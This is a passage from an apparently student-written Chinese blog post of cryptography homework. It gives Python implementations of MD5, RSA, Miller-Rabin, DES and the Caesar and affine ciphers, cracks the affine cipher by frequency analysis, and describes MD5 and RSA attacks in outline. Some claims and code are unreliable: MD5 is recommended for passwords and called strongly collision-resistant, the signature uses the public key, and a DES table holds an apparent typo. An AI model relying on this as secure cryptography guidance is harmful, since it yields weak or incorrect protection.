GG(D,A,B,C,M[i][2],9,get_t(30)) C = GG(C,D,A,B,M[i][7],14,get_t(31)) B = GG(B,C,D,A,M[i][12],20,get_t(32)) # 第三轮循环 A = HH(A,B,C,D,M[i][5],4,get_t(33)) D = HH(D,A,B,C,M[i][8],11,get_t(34)) C = HH(C,D,A,B,M[i][11],16,get_t(35)) B = HH(B,C,D,A,M[i][14],23,get_t(36)) A = HH(A,B,C,D,M[i][1],4,get_t(37)) D = HH(D,A,B,C,M[i][4],11,get_t(38)) C = HH(C,D,A,B,M[i][7],16,get_t(39)) B = HH(B,C,D,A,M[i][10],23,get_t(40)) A = HH(A,B,C,D,M[i][13],4,get_t(41)) D = HH(D,A,B,C,M[i][0],11,get_t(42)) C = HH(C,D,A,B,M[i][3],16,get_t(43)) B = HH(B,C,D,A,M[i][6],23,get_t(44)) A = HH(A,B,C,D,M[i][9],4,get_t(45)) D = HH(D,A,B,C,M[i][12],11,get_t(46)) C = HH(C,D,A,B,M[i][15],16,get_t(47)) B = HH(B,C,D,A,M[i][2],23,get_t(48)) # 第四轮循环 A = II(A,B,C,D,M[i][0],6,get_t(49)) D = II(D,A,B,C,M[i][7],10,get_t(50)) C = II(C,D,A,B,M[i][14],15,get_t(51)) B = II(B,C,D,A,M[i][5],21,get_t(52)) A = II(A,B,C,D,M[i][12],6,get_t(53)) D = II(D,A,B,C,M[i][3],10,get_t(54)) C = II(C,D,A,B,M[i][10],15,get_t(55)) B = II(B,C,D,A,M[i][1],21,get_t(56)) A = II(A,B,C,D,M[i][8],6,get_t(57)) D = II(D,A,B,C,M[i][15],10,get_t(58)) C = II(C,D,A,B,M[i][6],15,get_t(59)) B = II(B,C,D,A,M[i][13],21,get_t(60)) A = II(A,B,C,D,M[i][4],6,get_t(61)) D = II(D,A,B,C,M[i][11],10,get_t(62)) C = II(C,D,A,B,M[i][2],15,get_t(63)) B = II(B,C,D,A,M[i][9],21,get_t(64)) A = (AA + A) % 2**32 B = (BB + B) % 2**32 C = (CC + C) % 2**32 D = (DD + D) % 2**32 AA = A BB = B CC = C DD = Ddef encrypt(word): global A,B,C,D # 初始化链接向量 A = 0x67452301 B = 0xEFCDAB89 C = 0x98BADCFE D = 0x10325476 bintext = additonal_filling(word) bdata = bintext group_mess = [[]*16] # 分组消息数组 for i in range(16): group_mess[0].append(\"\") for i in range(len(bdata)//512): temp = bdata[i*512:i*512+512] for j in range(16): group_mess[0][j] = temp[j*32:j*32+32] step_function(group_mess) A = hex(A)[2:] B = hex(B)[2:] C = hex(C)[2:] D = hex(D)[2:] # 按小端字节序级联输出 out = \"\" for item in (A,B,C,D): for i in range(8//2): out += item[(3-i)*2:(3-i)*2+2] return outif __name__ == '__main__': word1 = \"iscbupt\" word2 = \"Beijing University of Posts and TelecommunicationsBeijing University of Posts and Telecommunications\" word3 = \"State Key Laboratory of Networking and Switching\" word4 = \"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!\" print(word1) print(encrypt(word1)) print(word2) print(encrypt(word2)) 实例演示： 安全性分析 ​ MD5算法是一种哈希算法，所以对于MD5算法的安全问题主要在于它是否具有足够的抗碰撞性。 ​ 在碰撞攻击方面，王小云教授研究很深入，她的成果集中在加速构造碰撞对。原来理论上构造出一个MD5碰撞对需要2^64次尝试，而现在只需要2^39次，其算法大大加速了这一过程。但从应用场景上来看，它本身并不具备太多的应用价值，因为构造出的碰撞很可能毫无意义。它的价值在于，在此算法基础上衍生出来的一系列MD5的算法，能够在部分场景下，构造出一个有意义的伪造信息，并且MD5值保持不变。所以，单单看这个算法本身就说MD5不安全，有些夸大其实。但是，后续的那些算法出现之后，MD5的安全性就真的有些令人担忧了，也就是下文要说的两种算法。 哈希长度扩展攻击，具体细节可以参考大牛道哥的博文 http://blog.chinaunix.net/uid-27070210-id-3255947.html，简单说来就是在已知输入M的长度（注意是长度）和其MD5值的情况下，可以在原文M后面附加任意内容，同时能够推算出新的MD5。在某些将MD5作为签名手段的系统中，攻击者可以在原文M后面随意添加内容同时能够提供正确的MD5值。 在校学习平台上就有类似的题目 存在这一问题的原因是算法使用了Merkle–Damgård construction进行数据的压缩，不止MD5，很多流行的算法都存在这个问题，比如SHA1。 特定前缀攻击。两个不同的exe程序会在屏幕上打出不同的字符，但是他们的MD5值确是相同的，exe程序下载地址如下 link，专家还给出了MD5碰撞快读生成器。 面对这两个攻击，一个提高MD5安全性的有效手段是 加盐（每一个口令同一个叫做”盐“（salt）的n位随机数相关联 ）。 实用性分析： ​ 即使MD5现在已经被证明不是百分百安全的，但是被攻破只是有限情况下的个例，对于大多数安全性要求不是很高的应用中，MD5依然拥有广泛的使用空间。MD5具有压缩性，容易计算，抗修改性和强抗碰撞性等特点，在实际应用中，其结果方便存储，在对文件加密上有很大的优势（只需要32位字符串就能对一个巨大的文件进行验证完整性 ），且加密损耗低，对性能要求较低，计算迅速。由于其不可逆的特性，在实际应用中可以用来用户密码，请求参数校验，文件校验等用途。 公钥密码 RSA公钥加密体制 ​ RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种非对称加密算法。RSA是目前最重要的网络加密算法。 算法原理： RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难 ​ 第一步 选定两个质数p、q，实际应用中这两个数越大安全性越高。 ​ 第二步 计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是密钥长度，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。 ​ 第三步 计算n的 欧拉函数 φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表 ​ 第四步 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击这里 ​ 第五步 寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用扩展欧几里得算法 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。 ​ 第六步 封装（n，e1）为公钥 ，（n，e2）为私钥。 ​ 至此，所有准备工作完成。 ​ 加密和解密 先介绍一下加解密的公式，假定明文为A，那么， 密文B≡A^e1 mod n，要传输给对方的就是B 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。 ​ 假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(^▽^)。 假定要传输的明文为： 32 注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode 编码传输。 ​ 加密 A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密 ​ 解密 A = B^e2 mod n = 32 ，成功得到明文32！ 简单证明一下上述算法的正确性： 欧拉定理 若n,a为正整数，且n,a互质，则$a^{φ(n)} ≡ 1 （mod \\; n）$ ​ φ（n）为 欧拉函数 ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质 如果n可以分解为两个互质的整数p、q的乘积，那么有φ（n）= (p-1) * (q-1) ​ 接下来要证明的就是为什么下面两个式子可以互换实现 B=A^e1 mod nA=B^e2 mod n ​ 解密规则为 A=B^e2 mod n ​ 根据加密规则 B = A^e1 mod nB = A^e1 - kn ​ 代入解密式中 (A^e1 - kn)^e2 ≡ A （mod n） ​ 等于证 $A^{e1*e2} ≡ m （mod \\; n）$ ​由 欧拉定理 可以得到 e1&#42;e2 ≡ 1 [ mod φ（n）]e1&#42;e2 ≡ hφ（n）+1 ​ 代入前面的式子可以得到 $A^{hφ（n）+1} \\; ≡ m (mod\\;n)$ ​ 上式恒成立，则算法正确性得证。 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import gmpy2 as gpimport mathimport sys# 字符串转为2进制def str2bin(s): text = \"\" for i in s: text += '&#123;:0&gt;8&#125;'.format(bin(ord(i))[2:]) return textdef bin2str(s): text = \"\" for i in range(len(s)//8): if int(s[i*8:i*8+8], 2) == 0: continue text += chr(int(s[i*8:i*8+8], 2)) return textdef fastExpMod(b, e, m): result = 1 while e != 0: if (e&amp;1) == 1: # ei = 1, then mul result = (result * b) % m e &gt;&gt;= 1 b = (b*b) % m return result# 加密函数,输入为plain字符明文，n，edef rsa_encrypt(plain): global n global e # 将明文转为比特串 bitplian = str2bin(plain) group_len = int(math.log(n,2)) - 1 arr_group = [] if (len(bitplian) % group_len) != 0: bitplian += \"0\"*(group_len-(len(bitplian) % group_len)) for i in range(len(bitplian) // group_len): arr_group.append(bitplian[i*group_len:i*group_len+group_len]) cipher = \"\" for item in arr_group: ci = fastExpMod(int(item,2),e,n) cipher += f'&#123;bin(ci)[2:]:0&gt;&#123;group_len+2&#125;&#125;' return hex(int(cipher,2))[2:]# 解密函数，输入为cipehr16进制密文，n，ddef rsa_decrypt(cipher): global n global d bitcipher = bin(int(cipher,16))[2:] temp_len = int(math.log(n,2)) + 1 if (len(bitcipher) % temp_len) != 0: bitcipher = \"0\"*(temp_len - (len(bitcipher) % temp_len)) + bitcipher group_len = int(math.log(n,2)) + 1 arr_group = [] for i in range(len(bitcipher) // group_len): arr_group.append(bitcipher[i*group_len:i*group_len+group_len]) bitplain = \"\" for item in arr_group: # mi = (int(item,2)**d % n) mi = fastExpMod(int(item,2),d,n) bitplain += f'&#123;bin(mi)[2:]:0&gt;&#123;group_len-2&#125;&#125;' return bin2str(bitplain)p = 2147483647q = 1000000007n = p * qpi_n = (p-1) * (q-1)e = 65537d = int(gp.invert(e,pi_n))if __name__ == \"__main__\": mode = sys.argv[1] if mode == 'e': plain = input(\"Plz input message: \") cipher = rsa_encrypt(plain) print(\"cipher: \", cipher) elif mode == 'd': cipher = input(\"Plz input cipher: \") plain = rsa_decrypt(cipher) print(\"plain: \",plain) else: pass 实例演示： 安全性分析 ​ 到目前为止，世界上还没有任何可靠的攻击RSA算法的方式 。然而即便RSA算法目前来说是安全可靠的，但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题，从而也派生出针对各种特定场景下的RSA攻击方法。 此处指简单列举一些攻击方法 直接分解n。一般这种情况是由于n较小，或者使用已经使用过的p、q造成的，这样会造成RSA直接被破解 低加密指数攻击。当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 即： cequiv m^e mod n 如果e=3，且$ m^e&lt;{n} $，那么： ​ $ c= m^e,$ $e=3$ ​ $ m=sqrt[3]{c}$ 如果明文的三次方比n大，但是不是足够大，那么设k，有： ​ $ c= m^e+kn$ 爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。 低加密指数广播攻击。如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有： ​ $ c_1equiv m^e$ $mod$ $n_1$ ​ $ c_2equiv m^e$ $mod$ $n_2$ ​ $ c_3equiv m^e$ $mod$ $n_3$ 对上述等式运用中国剩余定理，在e=3时，可以得到： ​ $ c_xequiv m^3$ $mod$ $n_1n_2n_3$ 通过对$ c_x $进行三次开方可以求得明文。 公模攻击。如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。 即： ​ $ c_1equiv m^{e_1}$ $mod$ $n$ ​ $ c_2equiv m^{e_2}$ $mod$ $n$ 此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。 ​ 由于RSA良好的安全性，RSA可用来电子签名中来确认通信双方身份。 通过对RSA的分析可知，RSA的安全性是基于大数的难分解性的，所以应尽可能选择足够大的p、q，目前大素数的产生依然是一个世界难题，这里展示一个素性判断算法miller-rabin算法，可以利用此算法判断一个数是不是素数从而穷举产生大素数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from random import randintimport mathdef xn_mod_p2(x, n, p): res = 1 # n_bin = bin(n)[2:] n_bin = bin(int(n))[2:] for i in range(0, len(n_bin)): res = res**2 % p if n_bin[i] == '1': res = res * x % p return resdef miller_rabin_witness(a, p): if p == 1: return False if p == 2: return True #p-1 = u*2^t 求解 u, t n = p - 1 t = int(math.floor(math.log(n, 2))) u = 1 while t &gt; 0: u = n / 2**t if n % 2**t == 0 and u % 2 == 1: break t = t - 1 b1 = b2 = xn_mod_p2(a, u, p) for i in range(1, t + 1): b2 = b1**2 % p if b2 == 1 and b1 != 1 and b1 != (p - 1): return False b1 = b2 if b1 != 1: return False return Truedef prime_test_miller_rabin(p, k): while k &gt; 0: a = randint(1, p - 1) if not miller_rabin_witness(a, p): return False k = k - 1 return Truenum = input(u\"请输入要进行Miller-Rabin算法检测的数：\")if prime_test_miller_rabin(int(num),10): print (u\"&#123;0&#125;大概率是素数\".format(num))else: print (u\"&#123;0&#125;是合数 \".format(num)) 实例演示： 通信过程模拟 ​ 有了前面的算法基础，我们现在可以模拟出一个从Alice到Bob的通信过程，步骤如下: ​ 接下来用代码详细模拟了一下该过程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import rsaimport md5import desprint(\"现在开始模拟Alice到Bob之间的通信过程：\")print()print('*******Alice的发送准备*********')print()message = \"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!\"# 设定message哈希值message_hash = md5.encrypt(message)sign = rsa.rsa_encrypt(message_hash)key = \"infosecu\"print(\"Alice想要发送到明文信息: \",message)print(\"Alice的DES秘钥：\", key)print(\"消息哈希(用于检验消息完整性): \",message_hash)print(\"Alice签名: \", sign)print()print('公开信道上传输DES加密数据')print()print('*******sending...**********')print()send_mess = des.encrypt(message,key)send_sign = des.encrypt(sign,key)print(\"message: \",send_mess)print(\"sign: \",send_sign)print(\"message_hash: \",message_hash)print()print('********sending finish*******')print()print()print(\"********Bob处理收到的信息********\")print()print(\"DES解密对应的内容：\")b_sign = des.decrypt(send_sign,key)b_mess = des.decrypt(send_mess,key)print(\"Alice发送的明文message： \",b_mess)print(\"消息签名sign： \",b_sign)print()b_mess_hash = md5.encrypt(message)print(\"此时Bob自己求出明文哈希值： \", b_mess_hash)print(\"之后与Alice发送的消息哈希进行校验\")print(\"...****....\")print(b_mess_hash,\"==\",message_hash,\"消息在传输过程中没有出错! 但是无法确定是否是Alice所发。\")print()vert = rsa.rsa_decrypt(sign)print(\"Bob对签名进行RSA解密： \",vert)print(\"对解密后的签名值与自己计算出的MD5值相比较来验证发送方身份..\")print(\"verting.....\")if vert == b_mess_hash: print(\"message is ok. 此时Bob可以确认从Alice处收到了完整的信息。\")else: print(\"message is broken.\")print()print(\"通信过程完成，Bob收到了Alice的信息！\") 实例演示：","categories":[{"name":"Record","slug":"Record","permalink":"http://chaosec.top/categories/Record/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://chaosec.top/tags/Crypto/"}]},{"title":"密码学作业记录（一）","slug":"crypto1","date":"2019-01-15T14:28:46.000Z","updated":"2019-01-30T11:44:17.367Z","comments":true,"path":"2019/01/15/crypto1/","link":"","permalink":"http://chaosec.top/2019/01/15/crypto1/","excerpt":"前言 最近在学习密码学，研究了一些密码学算法，特此记录一下。","text":"前言 最近在学习密码学，研究了一些密码学算法，特此记录一下。 古典密码 古典密码体制是基于古代落后的计算条件和落后的密码学与数学知识建立的，本部分选取了凯撒密码和仿射密码。 凯撒密码 凯撒密码本质上是一种置换密码，且为一对一的置换加密方式。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。 代码如下 1234567891011121314151617181920212223# 名密文输入范围是26个英文小写字母import sysmode = sys.argv[1]if mode == \"encrypt\": plain = raw_input(\"Please input plaintext: \") key = input(\"Please input key: \") cip = \"\" for i in range(len(plain)): temp = (ord(plain[i]) - ord('a') + key) % 26 + ord('a') cip += chr(temp) print(\"cipher: \" + cip)elif mode == \"decrypt\": cipher = raw_input(\"Please input cipher: \") key = input(\"Please input key: \") pla = \"\" for i in range(len(cipher)): temp = (ord(cipher[i])-ord(\"a\") - key) % 26 + ord('a') pla += chr(temp) print(\"plaintext: \" + pla)else: print(sys.argv[1],\" is not supported:(\") 安全性分析：可以看到，凯撒密码的加解密方式简单，手工即可实现，在古代落后的计算能力之下，该中算法拥有着很高的安全性，但是放在现在由于计算能力的提高，该算法表现出脆弱性，无法抵抗穷举攻击，因为对于一串明文，可能的加密组合只有26种，以现在的计算手段，对于任何攻击方式都表现出极大的脆弱性，当遭受已知明文攻击时完全没有抵抗性，故而现代密码体制中已不再采用该密码。 仿射密码 仿射密码的加密算法就是一个线性变换，及对任意的明文字符x，对应的密文字符为 y≡e(x)≡ax+b(mod 26)，其中a,b均为26以内的正整数，并且要求gcd(a,26)=1，函数e(x)称为仿射加密函数，解密时用x≡d(e(x))≡a&#39;(e(x)-b)(mod 26)来解密。 代码如下： 1234567891011121314151617181920212223242526272829303132import sysimport mathdef get_re(a): for i in range(0,27): if i*a % 26 == 1: return i# ex = ax+bmode = sys.argv[1]if mode == \"e\": p = str(input(\"Plz input plain: \")) a = int(input(\"Plz input a: \")) b = int(input(\"Plz input b: \")) c = \"\" for i in range(len(p)): t = ((ord(p[i]) - ord('a')) * a + b) % 26 + ord('a') c += chr(t) print(\"cipher: \" + c)elif mode == \"d\": # a'(e(x)-b) c = str(input(\"Plz input cipher: \")) a = int(input(\"Plz input a: \")) b = int(input(\"Plz input b: \")) p = \"\" _a = get_re(a) for i in range(len(c)): t = (ord(c[i]) - ord('a') - b)*_a % 26 + ord('a') p += chr(t) print(\"plain: \" + p)else: print(\"Input Error:(\") 加密时按照加密公式给出，解密时用穷举法求出a的逆元从而解密。 实例演示 可以看到，仿射加密和凯撒加密本质都是一种一对一的加密方式，这种加密方式没有将字母出现的统计规律隐藏起来，在英文中对于足够长的英文文本来说，字符的出现频率是相对固定的，还有字母的有些组合出现频率也是相对固定的，这样就可以通过统计分析法来破解上述加密方式加密出来的密文。 频率分析法破解仿射密码 12假如我们已知一串密文 fmxvedkaphferbndkrxrsrefmorudsdkdvshvufedkaprkdlyevlrhhrh，此时可以通过频率分析法尝试爆破出明文 代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import gmpy2import sysdic = ['e','t','a','o','i','n','s','h','r','d','l','c','u','m','w','f','g','y','p','b','v','k','j','x','q','z']freq = [0] * 26cipher = input(\"Plz input cipher: \")# 频率统计for i in range(len(cipher)): t = ord(cipher[i])-ord('a') freq[t] += 1 def get_ab(x,y): dic = ['e','t','a','o','i','n','s','h','r','d','l','c','u','m','w','f','g','y','p','b','v','k','j','x','q','z'] repeat = [] # 去除重复计算的项 for one in dic: for two in dic: o = ord(one) - ord('a') t = ord(two) - ord('a') oo = ord(x) - ord('a') tt = ord(y) - ord('a') # oo = a*o+b # tt = a*t+b if o - t == 0: continue a = ((oo-tt)//(o-t)) % 26 b = (oo - a * o) % 26 test = int(gmpy2.gcd(a, 26)) if test != 1: continue else: _a = gmpy2.invert(a, 26) plain = \"\" if (a,b) in repeat: continue for item in cipher: ex = ord(item) - ord('a') p = (_a * (ex - b)) % 26 plain += chr(p+ord('a')) repeat.append((a,b)) print(plain,end=\"\") print(\"**\" + str(a) + \"**\" + str(b)) print(\"共\" + str(len(repeat)) + \"项.\")x = chr(freq.index(max(freq)) + ord('a'))freq[freq.index(max(freq))] = 0y = chr(freq.index(max(freq)) + ord('a'))get_ab(x,y) 代码思路是先统计密文的字母出现频率，由频率高低依次对应字母频次表，联立方程组，由于未知数只有a、b，所以只需要两个方程是即可解出，依次尝试不同的变换组合即可，直至得到有意义的明文，由于统计基数的原因，密文越长，则越可能早的得到有意义的密文。为了使结果显示更加有效，代码中过滤了冗余的待选明文项（即a、b相同的情况）。 可以看到密文被成功破解 从对古典密码分析中可以看到，一个密码体系要保证安全性，应该尽可能的隐藏语言特性，即密文均匀分布，且加密的可选字符区间应尽可能的大，否则无法抵抗穷举攻击。在现代密码体制中，这两点都有了比较好的保证。 分组密码 DES加密算法 DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。 明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。 DES加密流程如下图 解密时只需要将机密流程逆序即可。 算法大致步骤如下： 初始置换 ​DES算法使用64位的密钥key将64位的明文输入块变为64位的密文输出块，并把输出块分为L0、R0两部分，每部分均为32位。初始置换规则可查表获得，这里不再赘述。初始置换是固定的、公开的函数，因此这个初始置换及逆初始置换都没有密码意义，主要目的是为了更好地将明文和密文分组。 下一步是进行轮函数（F函数）迭代，F函数具体步骤如下 扩展置换（E盒） 初始置换结束后，将得到64位序列分成两组，各32位，而E盒将数据的右32位输入扩展为48位输出，改变了位的次序，重复了某些位。 该步骤的目的是：a、产生与秘钥相同长度的数据以进行异或运算，R0是32位，子秘钥是48位，所以R0要先进行扩展置换之后与子秘钥进行异或运算；b、提供更长的结果，使得在替代运算时能够进行压缩。 秘钥加运算 该步骤非常简单，将E扩展输出的48位与48位子秘钥进行逐位异或，输出48位数据。 代换盒（S盒） 此步骤的功能是进行非线性变换，S盒是DES中唯一的非线性部分，经过S盒代换压缩之后，48位的数据重新被压缩成32位。 代换压缩由8个不同的代替盒(S盒)完成。每个S-盒有6位输入，4位输出。所以48位的输入块被分成8个6位的分组，每一个分组对应一个S-盒代替操作。经过S-盒代替，形成8个4位分组结果 S盒具有良好的非线性，输入的每一个比特与全部输入比特有关，两个输入相差1比特时，输入至少相差2比特，极大的保证了安全性。 置换运算（P盒） 置换运算（P盒）只是进行简单位置置换，而不进行扩展和压缩。 至此F函数结束 逆置换 将初始置换进行16次的迭代，即进行16层的加密变换，这个运算过程我们暂时称为F函数。得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。 代码如下：import sysimport binasciiip = [57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23,15, 7, 56, 48, 40, 32, 24, 16, 8, 0, 58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6]# 逆矩阵_ip = [39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25, 32, 0, 40, 8, 48, 16, 56, 24]# 初始化c、d数组c = [\"\"]*17d = [\"\"]*17k = [\"\"]*17# 左右32位数组l = [\"\"]*17r = [\"\"]*17def generate_secretkey(key, round): pc1 = [56, 48, 40, 32, 24, 16, 8, 0, 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 60, 52, 4, 36, 28, 20, 12, 4, 27, 19, 11, 3] respc1 = \"\" for i in range(56): respc1 += key[pc1[i]] c[0] = respc1[:28] d[0] = respc1[28:] k[0] = c[0] + d[0] for i in range(1,round+1): if i in (1,2,9,16): # 左移1位 c[i] = c[i-1][1:] + c[i-1][:1] d[i] = d[i-1][1:] + d[i-1][:1] else: c[i] = c[i-1][2:] + c[i-1][:2] d[i] = d[i-1][2:] + d[i-1][:2] secret = c[round] + d[round] pc2 = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8, 16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48, 44,49,39,56,34,53,46,42,50,36,29,32] s_key = \"\" # 生成本轮最终秘钥 for i in range(48): s_key += secret[pc2[i]-1] return s_key# 初始置换，输入为64位数据，8个ascii字符def init_replace(data): re = \"\" for i in range(64): re += data[ip[i]] return re# 扩展置换，输入为32位数据，输出为48位数据def e_replace(data): e_box = [31, 0, 1, 2, 3, 4, 3, 4, 5, 6, 7, 8, 7, 8, 9, 10, 11, 12, 11, 12, 13, 14, 15, 16, 15, 16, 17, 18, 19, 20, 19, 20, 21, 22, 23, 24, 23, 24, 25, 26, 27, 28, 27, 28, 29, 30, 31, 0] re = ['a'] * 48 for i in range(48): re[i] = data[e_box[i]] return re# 秘钥加处理def secret_plus(data, key): out = \"\" for i in range(48): out += str(int(data[i])^int(key[i])) return out# s盒置换，输入48位，输出32位def s_replace(data): s1 = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7], [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8], [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0], [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13]] s2 = [[15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10], [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5], [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15], [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9]] s3 = [[10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8], [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1], [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7], [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12]] s4 = [[7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15], [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9], [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4], [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14]] s5 = [[2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9], [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6], [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14], [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3]] s6 = [[12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11], [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8], [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6], [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13]] s7 = [[4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1], [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6], [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2], [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12]] s8 = [[13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7], [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2], [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8], [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]] re = [] for i in range(48//6): re.append(data[6*i:6*i+6]) # 开始进行s盒置换 dic = [s1,s2,s3,s4,s5,s6,s7,s8] retn = \"\" for i in range(8): r = int(re[i][0] + re[i][5],2) c = int(re[i][1:5], 2) temp = str(bin(dic[i][r][c]))[2:] temp = \"0\"*(4-len(temp)) + temp retn += temp # print(len(retn)) return retn# p盒置换，输入输出均为32位def p_replace(data): p = [15, 6, 19, 20, 28, 11, 27, 16, 0, 14, 22, 25, 4, 17, 30, 9, 1, 7, 23, 13, 31, 26, 2, 8, 18, 12, 29, 5, 21, 10, 3, 24] re = \"\" for i in range(32): re += data[p[i]] return re# F函数，32位数据，子秘钥，轮数def f_function(data, key, round): cipher = data # 左侧32位 cipher = e_replace(cipher) cipher = secret_plus(cipher, key) cipher = s_replace(cipher) cipher = p_replace(cipher) return cipherdef convert_key_bin(key): word = key key = \"\" for i in word: key += f'&#123;bin(ord(i))[2:]:0&gt;8&#125;' return key# 终极加密函数，参数为秘钥和明文(明文暂时测试为64位以内)def des_encrypt(ptext, key): for i in range(17): l[i] = \"\" r[i] = \"\" key = convert_key_bin(key) cipher = init_replace(ptext) l[0] = cipher[0:32] r[0] = cipher[32:] # 进行16层循环 for i in range(1,16): l[i] = r[i-1] secret_key = generate_secretkey(key,i) # 生成子秘钥 f_result = f_function(r[i-1],secret_key,i) for j in range(32): r[i] += str(int(l[i-1][j])^int(f_result[j])) secret_key = generate_secretkey(key,16) f_result = f_function(r[15],secret_key,16) l[16] = \"\" for j in range(32): l[16] += str(int(l[15][j])^int(f_result[j])) r[16] = r[15] temp = l[16] + r[16] final_cipher = \"\" for i in range(64): final_cipher += temp[_ip[i]] return f'&#123;hex(int(final_cipher,2))[2:]:0&gt;16&#125;'def des_decrypt(cipher,key): for i in range(17): l[i] = \"\" r[i] = \"\" # 恢复为64位密文 key = convert_key_bin(key) temp = bin(int(cipher, 16))[2:] cipher = \"0\"*(64-len(temp)) + temp cipher = init_replace(cipher) l[16] = cipher[:32] r[16] = cipher[32:] for i in range(16,1,-1): l[i-1] = r[i] secret_key = generate_secretkey(key,i) # 生成子秘钥 f_result = f_function(r[i],secret_key,i) r[i-1] = 